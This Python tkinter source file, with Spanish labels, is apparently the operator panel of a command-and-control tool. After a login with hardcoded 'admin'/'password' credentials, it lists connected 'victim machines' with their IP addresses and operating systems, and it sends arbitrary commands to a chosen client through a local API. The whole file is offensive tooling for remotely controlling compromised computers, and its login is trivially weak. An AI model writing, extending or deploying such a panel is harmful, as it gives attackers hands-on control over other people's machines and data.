import tkinter as tk
from tkinter import ttk
from tkinter import messagebox
from APIClient import APIClient


################# PETICIONES A LA API #######################

def actualizar_clientes(tree, info_text):
    info_text.config(state=tk.NORMAL)
    try:
        clientes_data = api_client.get_clients()
        for item in tree.get_children():
            tree.delete(item)
        for cliente in clientes_data:
            tree.insert("", tk.END, values=(
                cliente["id"], 
                cliente["client_id"], 
                cliente["ip_address"], 
                cliente["operating_system"], 
                cliente["last_seen"], 
                "Sí" if cliente["is_active"] else "No"))
        info_text.insert(tk.END, "Clientes actualizados correctamente.\n")
    except Exception as e:
        info_text.insert(tk.END, f"Error al actualizar clientes: {e}\n")
    info_text.config(state=tk.DISABLED)

def enviar_comando(info_text, entrada_id_cliente, entrada_comando):
    id_cliente = entrada_id_cliente.get()
    comando = entrada_comando.get()
    info_text.config(state=tk.NORMAL)
    if not id_cliente or not comando:
        info_text.insert(tk.END, "ID de cliente y comando son requeridos.\n")
        info_text.config(state=tk.DISABLED)
        return

    try:
        comando_data = {
            "client_id": int(id_cliente),  # Asegúrate de que el ID del cliente es un entero
            "command": comando
        }
        respuesta = api_client.create_command(comando_data)
        if respuesta:
            info_text.insert(tk.END, f"Comando '{comando}' enviado al cliente con ID: {id_cliente}\n")
        else:
            info_text.insert(tk.END, f"Error al enviar el comando al cliente con ID: {id_cliente}\n")
    except Exception as e:
        info_text.insert(tk.END, f"Error al enviar comando: {e}\n")
    info_text.config(state=tk.DISABLED)

api_client = APIClient("http://localhost:8000")

# Función para verificar las credenciales de inicio de sesión
def verificar_credenciales(username, password):
    return username == "admin" and password == "password"

def login():
    username = entry_username.get()
    password = entry_password.get()
    if verificar_credenciales(username, password):
        login_window.destroy()
        crear_ventana_principal()
    else:
        messagebox.showerror("Error", "Credenciales incorrectas")

# Ventana de inicio de sesión
def crear_ventana_login():
    global login_window, entry_username, entry_password
    login_window = tk.Tk()
    login_window.title("Inicio de Sesión")
    login_window.geometry("300x150")

    ttk.Label(login_window, text="Nombre de Usuario:").pack(pady=(10, 0))
    entry_username = ttk.Entry(login_window, width=25)
    entry_username.pack()

    ttk.Label(login_window, text="Contraseña:").pack(pady=(10, 0))
    entry_password = ttk.Entry(login_window, width=25, show="*")
    entry_password.pack()

    ttk.Button(login_window, text="Iniciar Sesión", command=login).pack(pady=(10, 0))

    login_window.mainloop()

def crear_ventana_principal():
    ventana = tk.Tk()
    ventana.title("Dashboard de Clientes")
    ventana.minsize(600, 400)

    estilo = ttk.Style(ventana)
    estilo.theme_use("clam")
    estilo.configure("Treeview", font=('Helvetica', 12), rowheight=25)
    estilo.configure("Treeview.Heading", font=('Helvetica', 14, 'bold'))

    frame_treeview = ttk.Frame(ventana, padding="10")
    frame_treeview.pack(expand=True, fill='both')

    global tree, info_text
    tree = ttk.Treeview(frame_treeview, columns=("ID", "Client ID", "IP", "Sistema Operativo", "Última Vista", "Activo"), show="headings")
    for col in ["ID", "Client ID", "IP", "Sistema Operativo", "Última Vista", "Activo"]:
        tree.heading(col, text=col, anchor=tk.CENTER)
        tree.column(col, anchor=tk.CENTER)

    tree.pack(expand=True, fill='both')

    frame_boton_actualizar = ttk.Frame(ventana, padding="10")
    frame_boton_actualizar.pack(fill='x')
    boton_actualizar = ttk.Button(frame_boton_actualizar, text="Actualizar nuevas máquinas víctima", command=lambda: actualizar_clientes(tree, info_text))
    boton_actualizar.pack(fill='x')

    frame_entradas = ttk.Frame(ventana, padding="10")
    frame_entradas.pack(fill='x')

    etiqueta_id = ttk.Label(frame_entradas, text="ID:")
    etiqueta_id.pack(side=tk.LEFT, padx=(0, 5))
    entrada_id_cliente = ttk.Entry(frame_entradas, width=10)
    entrada_id_cliente.pack(side=tk.LEFT, padx=(0, 5))

    etiqueta_comando = ttk.Label(frame_entradas, text="Comando:")
    etiqueta_comando.pack(side=tk.LEFT, padx=(0, 5))
    entrada_comando = ttk.Entry(frame_entradas, width=30)
    entrada_comando.pack(side=tk.LEFT, padx=(0, 5))

    boton_enviar = ttk.Button(frame_entradas, text="Enviar Comando", command=lambda: enviar_comando(info_text, entrada_id_cliente, entrada_comando))
    boton_enviar.pack(side=tk.LEFT, padx=(0, 5))
    
    info_text = tk.Text(ventana, height=4, state=tk.DISABLED)
    info_text.pack(fill='x', padx=10, pady=10)

    actualizar_clientes(tree, info_text)

    ventana.mainloop()

if __name__ == "__main__":
    crear_ventana_login()





